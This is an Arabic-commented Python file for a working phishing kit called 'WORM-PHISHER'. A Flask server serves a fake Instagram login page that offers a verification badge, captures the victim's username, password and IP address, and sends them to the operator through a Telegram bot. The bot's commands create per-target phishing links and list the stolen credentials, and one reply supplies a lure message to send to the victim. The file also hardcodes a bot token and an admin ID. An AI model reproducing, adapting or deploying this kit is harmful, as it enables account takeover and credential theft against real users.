import os
import sys
import json
import time
import random
import string
import requests
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import socket
from flask import Flask, request, jsonify, render_template_string

# ==================== التهيئة ====================
BOT_TOKEN = "8312804328:AAEUC8qxc8PjWjoihWu7hawTK1i4Gl6xOnE"
ADMIN_IDS = [8313661137]
PHISHING_FILE = "phishing_data.json"
LOG_FILE = "bot_logs.txt"

# ==================== Flask app للصفحات ====================
app = Flask(__name__)

# ==================== دوال المساعدة ====================
def generate_phish_id():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

def load_phishing_data():
    if os.path.exists(PHISHING_FILE):
        with open(PHISHING_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_phishing_data(data):
    with open(PHISHING_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

def create_phishing_page(phish_id, target_username):
    return f'''<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Instagram</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }}
        body {{ background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d); min-height: 100vh; display: flex; align-items: center; justify-content: center; }}
        .container {{ background: white; border-radius: 20px; padding: 40px; width: 100%; max-width: 400px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); }}
        .logo {{ text-align: center; margin-bottom: 30px; }}
        .logo img {{ width: 200px; }}
        h2 {{ text-align: center; color: #262626; margin-bottom: 20px; }}
        input {{ width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dbdbdb; border-radius: 6px; }}
        button {{ width: 100%; padding: 12px; background: #0095f6; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; }}
        .user-info {{ background: #f0f0f0; padding: 15px; border-radius: 10px; margin-bottom: 20px; }}
        hr {{ border: 1px dashed #ccc; margin: 15px 0; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
        </div>
        <h2>تأكيد الحساب للحصول على علامة التحقق</h2>
        
        <div class="user-info">
            <p><strong>معرف الصيد:</strong> #{phish_id}</p>
            <p><strong>المستهدف:</strong> @{target_username}</p>
        </div>
        
        <hr>
        
        <input type="text" id="username" placeholder="اسم المستخدم" value="{target_username}">
        <input type="password" id="password" placeholder="كلمة المرور">
        <button onclick="submitForm()">تأكيد</button>
    </div>

    <script>
    async function submitForm() {{
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        
        if (!password) return;
        
        await fetch('/submit', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify({{
                phish_id: '{phish_id}',
                username: username,
                password: password
            }})
        }});
        
        alert('تم الإرسال بنجاح');
        document.getElementById('password').value = '';
    }}
    </script>
</body>
</html>'''

# ==================== Flask Routes ====================
@app.route('/')
def home():
    return "WORM-PHISHER is running!"

@app.route('/phish/<phish_id>')
def phish_page(phish_id):
    data = load_phishing_data()
    
    if phish_id in data:
        # تسجيل الزيارة
        data[phish_id]['visits'] += 1
        save_phishing_data(data)
        
        # إرسال إشعار
        threading.Thread(target=notify_visit, args=(phish_id,)).start()
        
        return create_phishing_page(phish_id, data[phish_id]['target'])
    return "Phish not found", 404

@app.route('/submit', methods=['POST'])
def submit():
    data = request.json
    phish_id = data.get('phish_id')
    username = data.get('username')
    password = data.get('password')
    
    if phish_id and username and password:
        all_data = load_phishing_data()
        if phish_id in all_data:
            capture_info = {
                'gmail': username,
                'password': password,
                'time': datetime.now().isoformat(),
                'ip': request.remote_addr
            }
            all_data[phish_id]['captured'].append(capture_info)
            save_phishing_data(all_data)
            
            threading.Thread(target=notify_capture, args=(phish_id, username, password)).start()
    
    return "OK", 200

# ==================== إشعارات التيليجرام ====================
def notify_visit(phish_id):
    data = load_phishing_data()
    if phish_id in data:
        msg = f"👁 *زيارة جديدة*\n📌 #{phish_id}\n👤 @{data[phish_id]['target']}"
        send_telegram_notification(msg)

def notify_capture(phish_id, username, password):
    data = load_phishing_data()
    if phish_id in data:
        msg = f"🎯 *صيد جديد!*\n\n📌 #{phish_id}\n👤 @{data[phish_id]['target']}\n\n📧 `{username}`\n🔑 `{password}`"
        send_telegram_notification(msg)

def send_telegram_notification(message):
    for admin_id in ADMIN_IDS:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            requests.post(url, json={'chat_id': admin_id, 'text': message, 'parse_mode': 'Markdown'}, timeout=3)
        except:
            pass

# ==================== أوامر البوت ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # الحصول على رابط السيرفر
    server_url = os.environ.get('RENDER_EXTERNAL_URL', 'http://localhost:5000')
    
    welcome = f"""
🔱 WORM-PHISHER 🔱

تم التفعيل بواسطة: @ihh_4

الاوامر:
/new_phish <username> - صيد جديد
/list_phish - عرض الصيادات
/get_data <id> - عرض البيانات
/del_phish <id> - حذف صيد

📍 الرابط: {server_url}/phish/ID
    """
    await update.message.reply_text(welcome)

async def new_phish(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ ممنوع")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ استخدم: /new_phish <username>")
        return
    
    target = context.args[0]
    phish_id = generate_phish_id()
    
    data = load_phishing_data()
    data[phish_id] = {
        'target': target,
        'created_at': datetime.now().isoformat(),
        'visits': 0,
        'captured': []
    }
    save_phishing_data(data)
    
    server_url = os.environ.get('RENDER_EXTERNAL_URL', 'http://localhost:5000')
    link = f"{server_url}/phish/{phish_id}"
    
    msg = f"""
🎣 صيد جديد #{phish_id}
👤 @{target}
🔗 {link}

💬 أرسل هذه الرسالة للضحية:
"عزيزي {target}، تم اختيارك للحصول على علامة التحقق الزرقاء. سجل دخول من هنا: {link}"

® @ihh_4
    """
    await update.message.reply_text(msg)

async def list_phish(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return
    
    data = load_phishing_data()
    if not data:
        await update.message.reply_text("📭 لا يوجد صيادات")
        return
    
    msg = "📋 الصيادات:\n"
    for pid, info in list(data.items())[:10]:
        msg += f"\n#{pid} @{info['target']} - 👁 {info['visits']} - 🎯 {len(info['captured'])}"
    
    await update.message.reply_text(msg)

async def get_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS or len(context.args) != 1:
        return
    
    pid = context.args[0]
    data = load_phishing_data()
    
    if pid not in data:
        await update.message.reply_text("❌ لا يوجد")
        return
    
    info = data[pid]
    msg = f"📊 #{pid}\n👤 @{info['target']}\n👁 {info['visits']}\n📥 {len(info['captured'])}\n\n"
    
    for i, cap in enumerate(info['captured'][-10:], 1):
        msg += f"{i}. {cap['gmail']} : {cap['password']}\n"
    
    await update.message.reply_text(msg)

async def del_phish(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS or len(context.args) != 1:
        return
    
    pid = context.args[0]
    data = load_phishing_data()
    
    if pid in data:
        del data[pid]
        save_phishing_data(data)
        await update.message.reply_text(f"✅ حذف #{pid}")

# ==================== تشغيل البوت في خلفية ====================
def run_bot():
    app_bot = Application.builder().token(BOT_TOKEN).build()
    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(CommandHandler("new_phish", new_phish))
    app_bot.add_handler(CommandHandler("list_phish", list_phish))
    app_bot.add_handler(CommandHandler("get_data", get_data))
    app_bot.add_handler(CommandHandler("del_phish", del_phish))
    
    print("[+] البوت شغال...")
    app_bot.run_polling()

# ==================== الرئيسي ====================
if __name__ == "__main__":
    print("""
    تم تشغيل
    """)
    
    print("[+] تم تعيين التوكن")
    print("[+] تم تعيين المشرف: 8313661137")
    
    # تشغيل البوت في خيط منفصل
    threading.Thread(target=run_bot, daemon=True).start()
    
    # تشغيل Flask
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)